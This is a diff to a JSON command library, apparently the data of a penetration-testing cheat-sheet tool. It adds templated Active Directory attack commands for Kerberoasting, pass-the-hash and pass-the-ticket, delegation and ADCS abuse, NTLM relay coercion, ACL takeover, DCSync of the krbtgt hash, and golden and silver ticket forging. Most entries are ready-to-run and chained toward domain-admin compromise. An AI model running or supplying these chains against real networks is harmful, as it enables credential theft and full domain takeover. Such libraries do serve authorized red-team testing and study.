@@ -2192,5 +2192,325 @@
     "encoding": "raw",
     "template": "http://127.0.0.1:{RPORT}/",
     "notes": "Point a URL param inward. {RPORT} e.g. 80/8080/6379. Cloud metadata: http://169.254.169.254/latest/meta-data/."
+  },
+  {
+    "id": "ad-krb-usecc",
+    "group": "Active Directory",
+    "category": "Kerberos",
+    "name": "Use a ticket (KRB5CCNAME)",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "export KRB5CCNAME={TICKET}.ccache",
+    "notes": "Pass-the-ticket: point tools at a .ccache, then run with -k -no-pass. `klist` to inspect; `describeTicket.py` for details."
+  },
+  {
+    "id": "ad-krb-opth",
+    "group": "Active Directory",
+    "category": "Kerberos",
+    "name": "Over-pass-the-hash — TGT from NT hash",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "getTGT.py {DOMAIN}/{USER} -hashes :{HASH} -dc-ip {DC_IP}",
+    "notes": "Turns an NT hash into a Kerberos TGT (user.ccache). Then: export KRB5CCNAME=user.ccache and use -k -no-pass."
+  },
+  {
+    "id": "ad-krb-ptk",
+    "group": "Active Directory",
+    "category": "Kerberos",
+    "name": "Pass-the-key — TGT from AES key",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "getTGT.py {DOMAIN}/{USER} -aesKey {AESKEY} -dc-ip {DC_IP}",
+    "notes": "AES256 key -> TGT. Stealthier than RC4/NT. Key comes from secretsdump (aesKey) or -just-dc."
+  },
+  {
+    "id": "ad-krb-targeted",
+    "group": "Active Directory",
+    "category": "Kerberos",
+    "name": "Targeted Kerberoast (GenericWrite)",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "targetedKerberoast.py -v -d {DOMAIN} -u {USER} -p {PASS} --dc-ip {DC_IP}",
+    "notes": "With write over a user: temporarily sets an SPN, roasts it, restores. Crack the TGS offline."
+  },
+  {
+    "id": "ad-krb-roast-user",
+    "group": "Active Directory",
+    "category": "Kerberos",
+    "name": "Kerberoast a specific user",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "GetUserSPNs.py {DOMAIN}/{USER}:{PASS} -dc-ip {DC_IP} -request-user {TARGET_USER} -outputfile roast.txt",
+    "notes": "Request the TGS for one SPN account only. Crack with hashcat -m 13100."
+  },
+  {
+    "id": "ad-krb-skew",
+    "group": "Active Directory",
+    "category": "Kerberos",
+    "name": "Fix Kerberos clock skew",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "sudo ntpdate {DC_IP}",
+    "notes": "KRB_AP_ERR_SKEW / clock skew too great -> sync to the DC. Alt: sudo rdate -n {DC_IP}, or faketime for a one-off."
+  },
+  {
+    "id": "ad-krb-crack-asrep",
+    "group": "Active Directory",
+    "category": "Kerberos",
+    "name": "Crack AS-REP (hashcat 18200)",
+    "type": "hashcat",
+    "encoding": "raw",
+    "template": "hashcat -m 18200 asrep.txt {WORDLIST}",
+    "notes": "$krb5asrep$ hashes from AS-REP roasting."
+  },
+  {
+    "id": "ad-krb-crack-tgs",
+    "group": "Active Directory",
+    "category": "Kerberos",
+    "name": "Crack Kerberoast TGS (hashcat 13100)",
+    "type": "hashcat",
+    "encoding": "raw",
+    "template": "hashcat -m 13100 roast.txt {WORDLIST}",
+    "notes": "$krb5tgs$ hashes from Kerberoasting."
+  },
+  {
+    "id": "ad-deleg-find",
+    "group": "Active Directory",
+    "category": "Delegation",
+    "name": "Find delegation (uncon/con/RBCD)",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "findDelegation.py {DOMAIN}/{USER}:{PASS} -dc-ip {DC_IP}",
+    "notes": "Lists unconstrained, constrained, and resource-based delegation across the domain."
+  },
+  {
+    "id": "ad-deleg-s4u",
+    "group": "Active Directory",
+    "category": "Delegation",
+    "name": "Constrained delegation S4U (getST)",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "getST.py -spn {SPN} -impersonate {TARGET_USER} {DOMAIN}/{USER}:{PASS} -dc-ip {DC_IP}",
+    "notes": "Impersonate a user (e.g. Administrator) to an allowed SPN. Sets a .ccache; use with -k -no-pass."
+  },
+  {
+    "id": "ad-deleg-addcomputer",
+    "group": "Active Directory",
+    "category": "Delegation",
+    "name": "Add machine account (MAQ)",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "addcomputer.py {DOMAIN}/{USER}:{PASS} -computer-name 'ATTACK$' -computer-pass {NEWPASS} -dc-ip {DC_IP}",
+    "notes": "MachineAccountQuota default 10 lets any user add a computer. Needed for the RBCD chain."
+  },
+  {
+    "id": "ad-deleg-rbcd-set",
+    "group": "Active Directory",
+    "category": "Delegation",
+    "name": "RBCD — set AllowedToActOnBehalf",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "rbcd.py -delegate-from 'ATTACK$' -delegate-to {COMPUTER} -action write {DOMAIN}/{USER}:{PASS} -dc-ip {DC_IP}",
+    "notes": "Needs write over the target computer object. Then S4U from ATTACK$ to impersonate."
+  },
+  {
+    "id": "ad-deleg-rbcd-s4u",
+    "group": "Active Directory",
+    "category": "Delegation",
+    "name": "RBCD — S4U to target as admin",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "getST.py -spn cifs/{TARGET} -impersonate Administrator -dc-ip {DC_IP} {DOMAIN}/'ATTACK$':{NEWPASS}",
+    "notes": "Final RBCD step: get a service ticket as Administrator to {TARGET}."
+  },
+  {
+    "id": "ad-adcs-vuln",
+    "group": "Active Directory",
+    "category": "ADCS",
+    "name": "Certipy — find vulnerable templates",
+    "type": "certipy",
+    "encoding": "raw",
+    "template": "certipy find -u {USER}@{DOMAIN} -p {PASS} -dc-ip {DC_IP} -vulnerable -stdout",
+    "notes": "Flags ESC1-ESC8. Look for ENROLLEE_SUPPLIES_SUBJECT + client-auth EKU (ESC1)."
+  },
+  {
+    "id": "ad-adcs-esc1",
+    "group": "Active Directory",
+    "category": "ADCS",
+    "name": "Certipy ESC1 — request cert as admin",
+    "type": "certipy",
+    "encoding": "raw",
+    "template": "certipy req -u {USER}@{DOMAIN} -p {PASS} -dc-ip {DC_IP} -ca {CA} -template {TEMPLATE} -upn administrator@{DOMAIN}",
+    "notes": "ESC1: supply an arbitrary UPN. Yields administrator.pfx."
+  },
+  {
+    "id": "ad-adcs-auth",
+    "group": "Active Directory",
+    "category": "ADCS",
+    "name": "Certipy — PKINIT auth (pfx -> TGT/NT)",
+    "type": "certipy",
+    "encoding": "raw",
+    "template": "certipy auth -pfx administrator.pfx -dc-ip {DC_IP}",
+    "notes": "Authenticates with the cert: returns a TGT and the account's NT hash (UnPAC-the-hash)."
+  },
+  {
+    "id": "ad-adcs-shadow",
+    "group": "Active Directory",
+    "category": "ADCS",
+    "name": "Shadow Credentials (KeyCredentialLink)",
+    "type": "certipy",
+    "encoding": "raw",
+    "template": "certipy shadow auto -u {USER}@{DOMAIN} -p {PASS} -account {TARGET_USER} -dc-ip {DC_IP}",
+    "notes": "Needs GenericWrite/AddKeyCredentialLink over the target. Adds a key, PKINITs, returns NT hash."
+  },
+  {
+    "id": "ad-acl-setpw",
+    "group": "Active Directory",
+    "category": "ACL Abuse",
+    "name": "GenericAll — reset user password",
+    "type": "bloodyAD",
+    "encoding": "raw",
+    "template": "bloodyAD --host {DC_IP} -d {DOMAIN} -u {USER} -p {PASS} set password {TARGET_USER} {NEWPASS}",
+    "notes": "ForceChangePassword/GenericAll over a user -> set a new password."
+  },
+  {
+    "id": "ad-acl-addmember",
+    "group": "Active Directory",
+    "category": "ACL Abuse",
+    "name": "GenericWrite — add self to group",
+    "type": "bloodyAD",
+    "encoding": "raw",
+    "template": "bloodyAD --host {DC_IP} -d {DOMAIN} -u {USER} -p {PASS} add groupMember {GROUP} {USER}",
+    "notes": "Write over a group (e.g. an admin group) -> add yourself, then re-auth."
+  },
+  {
+    "id": "ad-acl-dacledit",
+    "group": "Active Directory",
+    "category": "ACL Abuse",
+    "name": "Grant DACL rights (dacledit)",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "dacledit.py -action write -rights FullControl -principal {USER} -target {TARGET_USER} {DOMAIN}/{USER}:{PASS} -dc-ip {DC_IP}",
+    "notes": "WriteDACL -> give yourself FullControl over the target, then abuse (reset pw / shadow creds)."
+  },
+  {
+    "id": "ad-acl-owneredit",
+    "group": "Active Directory",
+    "category": "ACL Abuse",
+    "name": "Take ownership (owneredit)",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "owneredit.py -action write -owner {USER} -target {TARGET_USER} {DOMAIN}/{USER}:{PASS} -dc-ip {DC_IP}",
+    "notes": "WriteOwner -> become owner, then dacledit to grant rights."
+  },
+  {
+    "id": "ad-coerce-petit",
+    "group": "Active Directory",
+    "category": "Coercion",
+    "name": "Coerce auth — PetitPotam",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "python3 PetitPotam.py -u {USER} -p {PASS} -d {DOMAIN} {LHOST} {DC_IP}",
+    "notes": "Forces the DC to authenticate to {LHOST}. Relay it (ntlmrelayx) to ADCS/LDAP. Also: printerbug.py / coercer."
+  },
+  {
+    "id": "ad-coerce-relay-adcs",
+    "group": "Active Directory",
+    "category": "Coercion",
+    "name": "ntlmrelayx -> ADCS (ESC8)",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "ntlmrelayx.py -t http://{TARGET}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
+    "notes": "Start this first, then coerce the DC. Captures a DC cert -> certipy auth -> DCSync."
+  },
+  {
+    "id": "ad-enum-rid",
+    "group": "Active Directory",
+    "category": "Enumeration",
+    "name": "nxc RID cycling",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc smb {DC_IP} -u {USER} -p {PASS} --rid-brute",
+    "notes": "Enumerate domain users/groups by SID even with minimal rights (or a null/guest session)."
+  },
+  {
+    "id": "ad-enum-bh",
+    "group": "Active Directory",
+    "category": "Enumeration",
+    "name": "nxc BloodHound collection",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc ldap {DC_IP} -u {USER} -p {PASS} --bloodhound --collection All --dns-server {DC_IP}",
+    "notes": "One-shot BloodHound gather over LDAP. Import the zip into BloodHound to find paths to DA."
+  },
+  {
+    "id": "ad-enum-ldap-asrep",
+    "group": "Active Directory",
+    "category": "Enumeration",
+    "name": "LDAP — AS-REP-roastable users",
+    "type": "ldapsearch",
+    "encoding": "raw",
+    "template": "ldapsearch -x -H ldap://{DC_IP} -D \"{USER}@{DOMAIN}\" -w {PASS} -b \"{BASEDN}\" \"(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" sAMAccountName",
+    "notes": "DONT_REQ_PREAUTH accounts -> AS-REP roast. BASEDN e.g. DC=corp,DC=local."
+  },
+  {
+    "id": "ad-enum-ldap-spn",
+    "group": "Active Directory",
+    "category": "Enumeration",
+    "name": "LDAP — SPN (kerberoastable) users",
+    "type": "ldapsearch",
+    "encoding": "raw",
+    "template": "ldapsearch -x -H ldap://{DC_IP} -D \"{USER}@{DOMAIN}\" -w {PASS} -b \"{BASEDN}\" \"(&(objectClass=user)(servicePrincipalName=*))\" sAMAccountName servicePrincipalName",
+    "notes": "User accounts with an SPN -> kerberoastable."
+  },
+  {
+    "id": "ad-enum-desc",
+    "group": "Active Directory",
+    "category": "Enumeration",
+    "name": "nxc — passwords in descriptions",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc ldap {DC_IP} -u {USER} -p {PASS} -M get-desc-users",
+    "notes": "Admins sometimes stash passwords in the description field. Quick win."
+  },
+  {
+    "id": "ad-ticket-sid",
+    "group": "Active Directory",
+    "category": "Ticket Abuse",
+    "name": "Get domain SID (lookupsid)",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "lookupsid.py {DOMAIN}/{USER}:{PASS}@{DC_IP} 0",
+    "notes": "Domain SID is needed for golden/silver tickets. Also enumerates users via RID."
+  },
+  {
+    "id": "ad-ticket-krbtgt",
+    "group": "Active Directory",
+    "category": "Ticket Abuse",
+    "name": "DCSync krbtgt only",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "secretsdump.py {DOMAIN}/{USER}:{PASS}@{DC_IP} -just-dc-user krbtgt",
+    "notes": "Pull just the krbtgt hash (for a golden ticket). Requires DCSync rights."
+  },
+  {
+    "id": "ad-ticket-golden",
+    "group": "Active Directory",
+    "category": "Ticket Abuse",
+    "name": "Golden ticket (ticketer)",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "ticketer.py -nthash {HASH} -domain-sid {SID} -domain {DOMAIN} Administrator",
+    "notes": "Authorized engagements only. Needs krbtgt NT hash + domain SID. Creates Administrator.ccache."
+  },
+  {
+    "id": "ad-ticket-silver",
+    "group": "Active Directory",
+    "category": "Ticket Abuse",
+    "name": "Silver ticket (service hash)",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "ticketer.py -nthash {HASH} -domain-sid {SID} -domain {DOMAIN} -spn cifs/{TARGET} Administrator",
+    "notes": "Forges a TGS for one service using that service account's hash. Scoped, stealthier than golden."
   }
 ]
